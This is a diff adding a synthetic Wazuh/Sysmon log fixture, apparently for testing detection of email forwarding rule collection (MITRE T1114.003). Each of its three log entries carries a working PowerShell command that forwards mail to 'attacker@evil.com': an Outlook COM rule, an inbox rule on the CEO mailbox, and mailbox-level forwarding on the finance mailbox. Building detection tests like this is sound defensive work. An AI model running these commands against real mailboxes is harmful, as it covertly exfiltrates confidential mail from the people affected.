@@ -1,0 +1,227 @@
+{
+  "_metadata": {
+    "attack_id": "T1114.003",
+    "variation": "001",
+    "name": "Email Collection: Email Forwarding Rule",
+    "description": "Creating email forwarding rules for collection",
+    "expected_detection": "MEDIUM",
+    "kill_chain_phase": "collection",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - PowerShell creating Outlook rule",
+      "sequence": 1,
+      "timestamp": "2026-01-30T10:05:00.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Outlook Forwarding Rule Creation",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1114.003"
+            ],
+            "tactic": [
+              "Collection"
+            ],
+            "technique": [
+              "Email Forwarding Rule"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000068.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-30 10:05:00.000",
+              "processGuid": "{FORWARD-001-0001-000000000001}",
+              "processId": "12100",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -c \"$outlook = New-Object -ComObject Outlook.Application; $rules = $outlook.Session.DefaultStore.GetRules(); $rule = $rules.Create('Forward All', 0); $rule.Actions.Forward.Recipients.Add('attacker@evil.com'); $rule.Actions.Forward.Enabled = $true; $rule.Enabled = $true; $rules.Save()\"",
+              "currentDirectory": "C:\\Users\\target\\",
+              "user": "CORP\\target",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=PS_HASH_1234567890ABCDEF1234567890ABCDEF1234567890",
+              "parentProcessGuid": "{FORWARD-001-0001-000000000000}",
+              "parentProcessId": "12100",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - Exchange PowerShell forwarding",
+      "sequence": 2,
+      "timestamp": "2026-01-30T10:05:05.000Z",
+      "log": {
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: Exchange Inbox Rule Creation",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1114.003"
+            ],
+            "tactic": [
+              "Collection"
+            ],
+            "technique": [
+              "Email Forwarding Rule"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000068.000002",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-30 10:05:05.000",
+              "processGuid": "{FORWARD-001-0001-000000000002}",
+              "processId": "12200",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -c \"New-InboxRule -Name 'Forward Important' -Mailbox 'ceo@corp.local' -ForwardTo 'attacker@evil.com' -SubjectContainsWords 'confidential','secret','financial'\"",
+              "currentDirectory": "C:\\Users\\attacker\\",
+              "user": "CORP\\attacker",
+              "integrityLevel": "High",
+              "hashes": "SHA256=PS_HASH_1234567890ABCDEF1234567890ABCDEF1234567890",
+              "parentProcessGuid": "{FORWARD-001-0001-000000000000}",
+              "parentProcessId": "12100",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - Set-Mailbox forwarding",
+      "sequence": 3,
+      "timestamp": "2026-01-30T10:05:10.000Z",
+      "log": {
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: Exchange Mailbox Forwarding",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1114.003"
+            ],
+            "tactic": [
+              "Collection"
+            ],
+            "technique": [
+              "Email Forwarding Rule"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000068.000003",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-30 10:05:10.000",
+              "processGuid": "{FORWARD-001-0001-000000000003}",
+              "processId": "12300",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -c \"Set-Mailbox -Identity 'finance@corp.local' -ForwardingSmtpAddress 'attacker@evil.com' -DeliverToMailboxAndForward $true\"",
+              "currentDirectory": "C:\\Users\\attacker\\",
+              "user": "CORP\\attacker",
+              "integrityLevel": "High",
+              "hashes": "SHA256=PS_HASH_1234567890ABCDEF1234567890ABCDEF1234567890",
+              "parentProcessGuid": "{FORWARD-001-0001-000000000000}",
+              "parentProcessId": "12100",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
